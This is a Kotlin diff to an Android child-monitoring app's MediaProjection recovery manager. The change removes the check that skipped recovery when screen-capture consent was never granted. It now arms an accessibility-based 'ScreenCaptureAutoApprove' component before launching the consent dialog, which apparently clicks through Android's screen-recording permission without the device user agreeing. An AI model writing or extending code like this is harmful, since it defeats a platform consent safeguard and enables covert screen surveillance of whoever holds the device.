@@ -4,7 +4,7 @@ import android.content.Context
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
-import com.childmonitor.MonitoringPrefs
+import com.childmonitor.accessibility.ScreenCaptureAutoApprove
 import com.childmonitor.debug.PcpFlowLogger
 import com.childmonitor.deviceowner.MediaProjectionConsentActivity
 import com.childmonitor.sync.MediaProjectionRecoveryTelemetry
@@ -39,10 +39,19 @@ object MediaProjectionRecoveryManager {
     fun attemptRecovery(context: Context, reason: String): Boolean {
         if (MediaProjectionTokenStore.hasValidToken(context)) return false
 
+        if (com.childmonitor.MonitoringPrefs.isPermissionSetupInProgress(context)) {
+            Log.d(TAG, "skip recovery — permission setup wizard in progress reason=$reason")
+            return false
+        }
+
+        if (!ScreenCaptureAutoApprove.isReady(context)) {
+            Log.d(TAG, "skip recovery — accessibility not ready reason=$reason")
+            return false
+        }
+
         val state = MediaProjectionTokenStore.getConsentState(context)
         if (state == MediaProjectionConsentState.NEVER_GRANTED) {
-            Log.d(TAG, "skip recovery — never granted reason=$reason")
-            return false
+            Log.d(TAG, "attempt recovery for never-granted consent reason=$reason")
         }
 
         if (recoveryInFlight) {
@@ -78,7 +87,7 @@ object MediaProjectionRecoveryManager {
         )
         Log.w(TAG, "Attempting MediaProjection recovery reason=$reason attempt=$attempt")
 
-        MonitoringPrefs.armScreenCaptureAutoApprove(context.applicationContext, 60_000L)
+        ScreenCaptureAutoApprove.armForConsent(context.applicationContext, 60_000L)
         launchConsentActivity(context.applicationContext)
         scheduleRecoveryWatchdog(context.applicationContext, reason, attempt)
         return true
@@ -99,6 +108,7 @@ object MediaProjectionRecoveryManager {
         MediaProjectionRecoveryTelemetry.recordRecoveryOutcome(context, success, reason)
         if (success) {
             queuedReason = null
+            MediaProjectionLossHandler.onProjectionRestored(context.applicationContext)
             return
         }
 
